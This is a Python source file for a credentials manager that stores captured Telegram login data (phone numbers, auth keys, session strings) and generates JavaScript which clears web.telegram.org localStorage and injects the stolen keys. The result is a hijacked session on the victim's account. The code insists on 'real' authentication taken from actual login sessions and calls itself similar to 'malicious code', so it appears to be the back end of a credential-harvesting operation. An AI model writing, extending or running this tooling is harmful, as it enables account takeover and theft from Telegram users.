import json
import os
import base64
from datetime import datetime
import logging
import time

logger = logging.getLogger(__name__)

class CredentialsManager:
    def __init__(self, storage_dir="credentials"):
        self.storage_dir = storage_dir
        self.ensure_storage_dir()
    
    def ensure_storage_dir(self):
        """Ensure the storage directory exists"""
        if not os.path.exists(self.storage_dir):
            os.makedirs(self.storage_dir)
            logger.info(f"Created credentials storage directory: {self.storage_dir}")
    
    def generate_telegram_credentials(self, user_info, session_data=None):
        """
        DEPRECATED: This method generates fake credentials and is no longer used.
        We now require real authentication keys from actual login sessions.
        """
        raise Exception("Real authentication required. Generated credentials are no longer supported. Use actual login session data instead.")
    
    def save_credentials(self, user_id, phone, session_data, user_info):
        """Save captured credentials to file - only accepts real authentication data"""
        try:
            logger.info(f"💾 Saving credentials for user {user_id}")
            logger.info(f"📱 Phone: {phone}")
            logger.info(f"📦 Session data keys: {list(session_data.keys())}")
            logger.info(f"👤 User info keys: {list(user_info.keys())}")
            
            # Validate that we have real authentication data
            if not session_data:
                raise Exception("No session data provided")
            
            # Check for real auth key
            if 'dc1_auth_key' not in session_data:
                raise Exception("No authentication key found in session data")
            
            auth_key = session_data['dc1_auth_key']
            if not auth_key or len(auth_key) < 100:
                raise Exception("Invalid or too short authentication key")
            
            # Check for session string
            if 'session_string' not in session_data:
                raise Exception("No session string found in session data")
            
            # Check for real authentication flag
            if not session_data.get('is_real_authentication', False):
                raise Exception("Session data does not contain real authentication")
            
            # Log some sample session data
            logger.info("📋 Sample session data:")
            for key, value in list(session_data.items())[:3]:
                preview = str(value)[:50] + "..." if len(str(value)) > 50 else str(value)
                logger.info(f"   {key}: {preview}")
            
            credentials = {
                'user_id': user_id,
                'phone': phone,
                'session_data': session_data,
                'user_info': user_info,
                'captured_at': datetime.now().isoformat(),
                'has_real_auth_key': True,  # We've validated this above
                'has_session_string': True,  # We've validated this above
                'is_real_authentication': True,
                'auth_key_length': len(auth_key),
                'validation_status': 'validated_real_auth'
            }
            
            logger.info(f"✅ REAL credentials prepared with {len(credentials)} items")
            logger.info(f"🔑 Real auth key validated: {len(auth_key)} characters")
            logger.info(f"📦 Session string validated: {len(session_data['session_string'])} characters")
            logger.info(f"✅ Authentication type: REAL (not generated)")
            
            # Save to file
            filename = f"credentials_{user_id}_{int(time.time())}.json"
            filepath = os.path.join(self.storage_dir, filename)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(credentials, f, indent=2, ensure_ascii=False)
            
            logger.info(f"💾 REAL credentials saved to {filepath}")
            
            # Also generate and save localStorage script
            try:
                script_filename = f"script_{user_id}_{int(time.time())}.js"
                script_filepath = os.path.join(self.storage_dir, script_filename)
                
                # Generate script from the session_data using working format
                script_content = self.generate_working_format_script(session_data)
                
                with open(script_filepath, 'w', encoding='utf-8') as f:
                    f.write(script_content)
                
                logger.info(f"💾 localStorage script saved to {script_filepath}")
                
            except Exception as e:
                logger.error(f"❌ Error saving localStorage script: {e}")
            
            return filename
            
        except Exception as e:
            logger.error(f"❌ Error saving credentials: {e}")
            logger.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
            import traceback
            logger.error(f"❌ Traceback: {traceback.format_exc()}")
            raise Exception(f"Failed to save credentials: {str(e)}")
    
    def generate_localStorage_script(self, credentials):
        """
        Generate the JavaScript code that would set localStorage items
        Similar to the malicious code you provided
        """
        script_lines = [
            "// Telegram Web Credentials - localStorage Setup Script",
            "// Generated for manual access",
            "",
            "if(location.host==\"web.telegram.org\"){",
            "    localStorage.clear(),",
            "    Object.entries({"
        ]
        
        # Add each credential as a localStorage item
        for key, value in credentials.items():
            # Handle None values and convert to string
            if value is None:
                value = ""
            
            # Convert value to string if it isn't already
            value_str = str(value)
            
            # Special formatting for different types of values
            if key.endswith('_auth_key') or key.endswith('_server_salt') or key == 'auth_key_fingerprint':
                # Auth keys, server salts, and fingerprints need to be wrapped in quotes
                escaped_value = f'"{value_str}"'
            else:
                # Only escape quotes if the value contains quotes (JSON values)
                if '"' in value_str:
                    escaped_value = value_str.replace('"', '\\"')
                else:
                    escaped_value = value_str
            
            script_lines.append(f'        "{key}":"{escaped_value}",')
        
        # Remove the last comma and close the script
        if script_lines:
            script_lines[-1] = script_lines[-1].rstrip(',')
        
        script_lines.extend([
            "    }).forEach(i=>localStorage.setItem(i[0],i[1]))",
            "}",
            'location="https://web.telegram.org/a/"',
            ""
        ])
        
        return "\n".join(script_lines)
    
    def save_localStorage_script(self, credentials, filename=None):
        """
        Save just the localStorage script to a separate file
        """
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"localStorage_script_{timestamp}.js"
        
        filepath = os.path.join(self.storage_dir, filename)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(self.generate_localStorage_script(credentials))
            
            logger.info(f"localStorage script saved to: {filepath}")
            return filepath
            
        except Exception as e:
            logger.error(f"Failed to save localStorage script: {e}")
            return None
    
    def list_credentials_files(self):
        """List all saved credentials files"""
        files = []
        if os.path.exists(self.storage_dir):
            for filename in os.listdir(self.storage_dir):
                if filename.endswith('.json') or filename.endswith('.js'):
                    filepath = os.path.join(self.storage_dir, filename)
                    stat = os.stat(filepath)
                    files.append({
                        'filename': filename,
                        'filepath': filepath,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        return sorted(files, key=lambda x: x['modified'], reverse=True)
    
    def load_credentials(self, filename):
        """Load credentials from a file"""
        filepath = os.path.join(self.storage_dir, filename)
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load credentials from {filename}: {e}")
            return None
    
    def generate_working_format_script(self, credentials):
        """
        Generate the JavaScript code in the exact format of the working example
        """
        # Create the script in the exact format as the working example
        script = 'if(location.host=="web.telegram.org"){localStorage.clear(),Object.entries({'
        
        # Add each credential as a localStorage item with proper formatting
        items = []
        for key, value in credentials.items():
            # Handle None values and convert to string
            if value is None:
                value = ""
            
            # Convert value to string if it isn't already
            value_str = str(value)
            
            # Format based on the working example - auth keys and salts need escaped quotes
            if key.endswith('_auth_key') or key.endswith('_server_salt') or key == 'auth_key_fingerprint':
                # These need to be wrapped in escaped quotes like in the working example
                escaped_value = f'\\"{value_str}\\"'
            else:
                # Other values: just escape quotes if present
                if '"' in value_str:
                    escaped_value = value_str.replace('"', '\\"')
                else:
                    escaped_value = value_str
            
            items.append(f'"{key}":"{escaped_value}"')
        
        # Join all items and close the script
        script += ','.join(items)
        script += '}).forEach(i=>localStorage.setItem(i[0],i[1]))}location="https://web.telegram.org/a/"'
        
        return script

# Global instance
credentials_manager = CredentialsManager() 